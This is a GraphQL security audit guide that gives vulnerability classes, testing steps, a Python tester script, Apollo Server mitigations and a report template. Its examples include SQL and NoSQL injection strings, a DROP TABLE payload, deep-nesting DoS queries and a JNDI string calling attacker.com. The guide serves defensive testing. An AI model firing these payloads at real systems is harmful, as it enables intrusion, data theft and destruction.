# GraphQL API Security Audit Guide

## Overview

GraphQL introduces unique security considerations that differ from traditional REST APIs. This guide provides comprehensive security testing methodologies, common vulnerabilities, and best practices for GraphQL API security audits.

## Table of Contents

1. [GraphQL Security Fundamentals](#graphql-security-fundamentals)
2. [Common GraphQL Vulnerabilities](#common-graphql-vulnerabilities)
3. [Security Testing Methodology](#security-testing-methodology)
4. [Automated Testing Tools](#automated-testing-tools)
5. [Manual Testing Techniques](#manual-testing-techniques)
6. [Security Best Practices](#security-best-practices)
7. [Compliance Considerations](#compliance-considerations)

## GraphQL Security Fundamentals

### Key Differences from REST

- **Single Endpoint**: All operations go through one URL
- **Query Flexibility**: Clients can request specific data fields
- **Introspection**: Schema discovery capabilities
- **Nested Queries**: Complex, deeply nested requests possible
- **Real-time Subscriptions**: WebSocket-based live data

### Security Implications

- **Query Complexity**: Risk of resource exhaustion
- **Information Disclosure**: Schema introspection exposure
- **Authorization Granularity**: Field-level access control needed
- **Input Validation**: Multiple injection vectors
- **Rate Limiting Challenges**: Traditional methods may not apply

## Common GraphQL Vulnerabilities

### 1. Query Complexity Attacks (DoS)

**Description**: Maliciously complex queries that consume excessive server resources.

**Example Attack**:
```graphql
query MaliciousQuery {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Testing Methods**:
- Send deeply nested queries
- Use query aliases to multiply operations
- Combine multiple expensive operations
- Test query timeout limits

**Mitigation**:
- Implement query depth limiting
- Query complexity analysis
- Timeout mechanisms
- Resource monitoring

### 2. Introspection Information Disclosure

**Description**: Exposed schema information reveals API structure and sensitive fields.

**Example Attack**:
```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**Testing Methods**:
- Check if introspection is enabled
- Extract complete schema information
- Identify sensitive fields and operations
- Map data relationships

**Mitigation**:
- Disable introspection in production
- Implement schema filtering
- Use schema stitching carefully
- Monitor introspection usage

### 3. Authorization Bypass

**Description**: Inadequate field-level authorization allowing unauthorized data access.

**Example Attack**:
```graphql
query UnauthorizedAccess {
  user(id: "123") {
    email
    personalData {
      ssn
      creditCard
    }
    adminNotes
  }
}
```

**Testing Methods**:
- Test field-level authorization
- Attempt to access restricted fields
- Use different user contexts
- Test nested object permissions

**Mitigation**:
- Implement field-level authorization
- Use authorization directives
- Validate permissions at resolver level
- Implement data filtering

### 4. Injection Attacks

**Description**: SQL, NoSQL, or command injection through GraphQL arguments.

**Example Attack**:
```graphql
query SQLInjection {
  user(id: "1' OR '1'='1") {
    name
    email
  }
}

mutation NoSQLInjection {
  updateUser(filter: "{\"$where\": \"this.password.match(/.*/)\"}", data: {name: "hacker"}) {
    id
  }
}
```

**Testing Methods**:
- Test all input parameters
- Use SQL injection payloads
- Test NoSQL injection patterns
- Check command injection vectors

**Mitigation**:
- Use parameterized queries
- Implement input validation
- Sanitize user inputs
- Use ORM/ODM safely

### 5. Batching Attacks

**Description**: Sending multiple operations in a single request to bypass rate limiting.

**Example Attack**:
```graphql
[
  {"query": "query { sensitiveData { value } }"},
  {"query": "query { sensitiveData { value } }"},
  {"query": "query { sensitiveData { value } }"},
  // ... repeat 1000 times
]
```

**Testing Methods**:
- Send batched queries
- Test rate limiting effectiveness
- Combine with complexity attacks
- Test resource consumption

**Mitigation**:
- Limit batch size
- Implement query-aware rate limiting
- Monitor resource usage per batch
- Use query whitelisting

### 6. Subscription Abuse

**Description**: Overwhelming server with subscription connections or complex subscription queries.

**Example Attack**:
```graphql
subscription MaliciousSubscription {
  messageAdded {
    user {
      posts {
        comments {
          author {
            followers {
              name
            }
          }
        }
      }
    }
  }
}
```

**Testing Methods**:
- Create multiple subscription connections
- Test complex subscription queries
- Check connection limits
- Test subscription authentication

**Mitigation**:
- Limit concurrent subscriptions
- Implement subscription complexity limits
- Use connection throttling
- Authenticate subscription connections

## Security Testing Methodology

### 1. Discovery Phase

#### Schema Discovery
```bash
# Test introspection availability
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "query { __schema { types { name } } }"}' \
  https://api.example.com/graphql

# Extract full schema
curl -X POST \
  -H "Content-Type: application/json" \
  -d @introspection-query.json \
  https://api.example.com/graphql
```

#### Endpoint Discovery
```bash
# Common GraphQL endpoints
/graphql
/graphiql
/api/graphql
/v1/graphql
/query
/api/query
```

### 2. Authentication Testing

#### Test Authentication Methods
```graphql
# Test without authentication
query TestUnauth {
  users {
    id
    email
  }
}

# Test with invalid token
# Headers: Authorization: Bearer invalid_token
query TestInvalidAuth {
  users {
    id
    email
  }
}

# Test token manipulation
# Headers: Authorization: Bearer manipulated_token
query TestManipulatedAuth {
  users {
    id
    email
  }
}
```

### 3. Authorization Testing

#### Field-Level Authorization
```graphql
# Test accessing restricted fields
query TestFieldAuth {
  user(id: "123") {
    id
    name
    email          # Should be accessible
    ssn            # Should be restricted
    adminNotes     # Should be admin-only
  }
}

# Test cross-user data access
query TestCrossUserAccess {
  user(id: "456") {  # Different user's data
    personalData {
      address
      phone
    }
  }
}
```

### 4. Input Validation Testing

#### SQL Injection Testing
```graphql
query SQLInjectionTest($userId: String!) {
  user(id: $userId) {
    name
    email
  }
}

# Variables:
{
  "userId": "1' OR '1'='1"
}
```

#### NoSQL Injection Testing
```graphql
mutation NoSQLInjectionTest($filter: String!) {
  users(filter: $filter) {
    id
    name
  }
}

# Variables:
{
  "filter": "{\"$where\": \"this.password.match(/.*/)\"}"
}
```

### 5. DoS Testing

#### Query Depth Testing
```graphql
query DeepQuery {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}
```

#### Query Complexity Testing
```graphql
query ComplexQuery {
  a: users { id name email }
  b: users { id name email }
  c: users { id name email }
  d: users { id name email }
  e: users { id name email }
  # ... repeat with many aliases
}
```

## Automated Testing Tools

### 1. GraphQL Security Scanner

```bash
# Install graphql-cop
npm install -g graphql-cop

# Run security scan
graphql-cop --endpoint https://api.example.com/graphql
```

### 2. InQL Scanner (Burp Suite Extension)

- Install InQL extension in Burp Suite
- Configure GraphQL endpoint
- Run automated vulnerability scans
- Review findings and false positives

### 3. GraphQL Voyager

```bash
# Install and run GraphQL Voyager
npm install -g graphql-voyager
voyager --endpoint https://api.example.com/graphql
```

### 4. Custom Testing Scripts

```python
#!/usr/bin/env python3
"""
GraphQL Security Testing Script
"""

import requests
import json
import time

class GraphQLTester:
    def __init__(self, endpoint, headers=None):
        self.endpoint = endpoint
        self.headers = headers or {'Content-Type': 'application/json'}
    
    def send_query(self, query, variables=None):
        """Send GraphQL query and return response"""
        payload = {'query': query}
        if variables:
            payload['variables'] = variables
        
        response = requests.post(
            self.endpoint,
            json=payload,
            headers=self.headers
        )
        return response
    
    def test_introspection(self):
        """Test if introspection is enabled"""
        introspection_query = """
        query IntrospectionQuery {
          __schema {
            types {
              name
            }
          }
        }
        """
        
        response = self.send_query(introspection_query)
        if response.status_code == 200:
            data = response.json()
            if 'data' in data and '__schema' in data['data']:
                print("✓ Introspection is enabled")
                return True
        
        print("✗ Introspection is disabled")
        return False
    
    def test_query_depth(self, max_depth=10):
        """Test query depth limits"""
        for depth in range(1, max_depth + 1):
            query = self.generate_deep_query(depth)
            response = self.send_query(query)
            
            if response.status_code != 200:
                print(f"✗ Query depth limit: {depth - 1}")
                return depth - 1
        
        print(f"⚠ No query depth limit found (tested up to {max_depth})")
        return None
    
    def generate_deep_query(self, depth):
        """Generate deeply nested query"""
        query = "query DeepQuery { user "
        for i in range(depth):
            query += "{ posts "
        query += "{ title }"
        for i in range(depth):
            query += " }"
        query += " }"
        return query
    
    def test_batch_queries(self, batch_size=100):
        """Test batch query limits"""
        queries = []
        for i in range(batch_size):
            queries.append({
                "query": "query { users { id name } }"
            })
        
        response = requests.post(
            self.endpoint,
            json=queries,
            headers=self.headers
        )
        
        if response.status_code == 200:
            print(f"⚠ Batch queries allowed (size: {batch_size})")
            return True
        else:
            print(f"✓ Batch queries limited or disabled")
            return False

# Usage example
if __name__ == "__main__":
    tester = GraphQLTester("https://api.example.com/graphql")
    
    print("Starting GraphQL Security Tests...")
    tester.test_introspection()
    tester.test_query_depth()
    tester.test_batch_queries()
```

## Manual Testing Techniques

### 1. Schema Analysis

1. **Extract Schema**: Use introspection to get complete schema
2. **Identify Sensitive Fields**: Look for PII, admin fields, internal data
3. **Map Relationships**: Understand data connections and dependencies
4. **Find Mutations**: Identify state-changing operations

### 2. Authentication Bypass Testing

```graphql
# Test without authentication
query NoAuth { users { id email } }

# Test with malformed tokens
# Authorization: Bearer malformed_token

# Test with expired tokens
# Authorization: Bearer expired_token

# Test with manipulated tokens
# Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0...
```

### 3. Authorization Testing

```graphql
# Test horizontal privilege escalation
query HorizontalEscalation {
  user(id: "other_user_id") {
    personalData {
      ssn
      address
    }
  }
}

# Test vertical privilege escalation
query VerticalEscalation {
  adminUsers {
    id
    permissions
  }
}
```

### 4. Input Validation Testing

```graphql
# Test various injection payloads
query InjectionTest($input: String!) {
  search(query: $input) {
    results
  }
}

# Test with variables:
{
  "input": "'; DROP TABLE users; --"
}
{
  "input": "{{7*7}}"
}
{
  "input": "${jndi:ldap://attacker.com/a}"
}
```

## Security Best Practices

### 1. Query Security

- **Implement Query Depth Limiting**
  ```javascript
  const depthLimit = require('graphql-depth-limit');
  
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [depthLimit(7)]
  });
  ```

- **Query Complexity Analysis**
  ```javascript
  const costAnalysis = require('graphql-cost-analysis');
  
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    plugins: [
      costAnalysis({
        maximumCost: 1000,
        onComplete: (cost) => {
          console.log(`Query cost: ${cost}`);
        }
      })
    ]
  });
  ```

### 2. Authentication & Authorization

- **Field-Level Authorization**
  ```javascript
  const resolvers = {
    User: {
      email: (parent, args, context) => {
        if (!context.user || context.user.id !== parent.id) {
          throw new Error('Unauthorized');
        }
        return parent.email;
      }
    }
  };
  ```

- **Directive-Based Authorization**
  ```graphql
  type User {
    id: ID!
    name: String!
    email: String! @auth(requires: USER)
    ssn: String! @auth(requires: ADMIN)
  }
  ```

### 3. Input Validation

- **Schema Validation**
  ```graphql
  input CreateUserInput {
    name: String! @constraint(minLength: 1, maxLength: 100)
    email: String! @constraint(format: "email")
    age: Int! @constraint(min: 0, max: 150)
  }
  ```

- **Custom Scalars**
  ```javascript
  const { GraphQLScalarType } = require('graphql');
  const { GraphQLError } = require('graphql/error');
  
  const EmailType = new GraphQLScalarType({
    name: 'Email',
    serialize: value => value,
    parseValue: value => {
      if (!isValidEmail(value)) {
        throw new GraphQLError('Invalid email format');
      }
      return value;
    }
  });
  ```

### 4. Rate Limiting

- **Query-Based Rate Limiting**
  ```javascript
  const { shield, rule, and, or } = require('graphql-shield');
  const { RateLimiterMemory } = require('rate-limiter-flexible');
  
  const rateLimiter = new RateLimiterMemory({
    keyGenerator: (root, args, context) => context.user.id,
    points: 5,
    duration: 60,
  });
  
  const rateLimit = rule({ cache: 'contextual' })(
    async (parent, args, context) => {
      try {
        await rateLimiter.consume(context.user.id);
        return true;
      } catch {
        return new Error('Rate limit exceeded');
      }
    }
  );
  ```

### 5. Production Security

- **Disable Introspection**
  ```javascript
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    introspection: process.env.NODE_ENV !== 'production',
    playground: process.env.NODE_ENV !== 'production'
  });
  ```

- **Query Whitelisting**
  ```javascript
  const allowedQueries = new Set([
    'query GetUser { user { id name } }',
    'mutation CreateUser($input: CreateUserInput!) { createUser(input: $input) { id } }'
  ]);
  
  const server = new ApolloServer({
    typeDefs,
    resolvers,
    plugins: [
      {
        requestDidStart() {
          return {
            didResolveOperation(requestContext) {
              if (!allowedQueries.has(requestContext.request.query)) {
                throw new Error('Query not allowed');
              }
            }
          };
        }
      }
    ]
  });
  ```

## Compliance Considerations

### GDPR Compliance

- **Data Minimization**: Only request necessary fields
- **Right to be Forgotten**: Implement data deletion mutations
- **Consent Management**: Track field-level consent
- **Data Portability**: Provide data export capabilities

### HIPAA Compliance

- **Audit Logging**: Log all data access
- **Encryption**: Encrypt sensitive health data
- **Access Controls**: Implement role-based field access
- **Data Integrity**: Validate medical data inputs

### PCI DSS Compliance

- **Cardholder Data**: Restrict payment field access
- **Tokenization**: Use tokens instead of raw card data
- **Logging**: Monitor payment-related queries
- **Network Security**: Secure GraphQL endpoints

## Testing Checklist

### Discovery
- [ ] Identify GraphQL endpoints
- [ ] Test introspection availability
- [ ] Extract complete schema
- [ ] Map sensitive fields and operations

### Authentication
- [ ] Test without authentication
- [ ] Test with invalid/expired tokens
- [ ] Test token manipulation
- [ ] Verify authentication requirements

### Authorization
- [ ] Test field-level authorization
- [ ] Test cross-user data access
- [ ] Test role-based restrictions
- [ ] Verify admin-only operations

### Input Validation
- [ ] Test SQL injection in all parameters
- [ ] Test NoSQL injection patterns
- [ ] Test XSS in string fields
- [ ] Test command injection vectors

### DoS Protection
- [ ] Test query depth limits
- [ ] Test query complexity limits
- [ ] Test batch query restrictions
- [ ] Test subscription limits

### Information Disclosure
- [ ] Check error message verbosity
- [ ] Test schema information leakage
- [ ] Verify debug mode disabled
- [ ] Check for sensitive data exposure

### Rate Limiting
- [ ] Test API rate limits
- [ ] Test query-specific limits
- [ ] Test subscription rate limits
- [ ] Verify bypass protection

## Reporting Template

```markdown
# GraphQL Security Audit Report

## Executive Summary
Brief overview of findings and risk assessment.

## Methodology
Testing approach and tools used.

## Findings

### Critical Issues
1. **Introspection Enabled in Production**
   - **Risk**: Information Disclosure
   - **Impact**: Schema exposure reveals API structure
   - **Recommendation**: Disable introspection in production

### High Issues
1. **No Query Depth Limiting**
   - **Risk**: Denial of Service
   - **Impact**: Resource exhaustion attacks possible
   - **Recommendation**: Implement query depth limits

### Medium Issues
1. **Verbose Error Messages**
   - **Risk**: Information Disclosure
   - **Impact**: Internal system information leaked
   - **Recommendation**: Sanitize error messages

## Recommendations
1. Implement comprehensive security controls
2. Regular security testing and monitoring
3. Developer security training
4. Security code review process

## Conclusion
Overall security posture assessment and next steps.
```

---

*This guide provides comprehensive GraphQL security testing methodologies. Regularly update testing techniques as GraphQL security landscape evolves.*
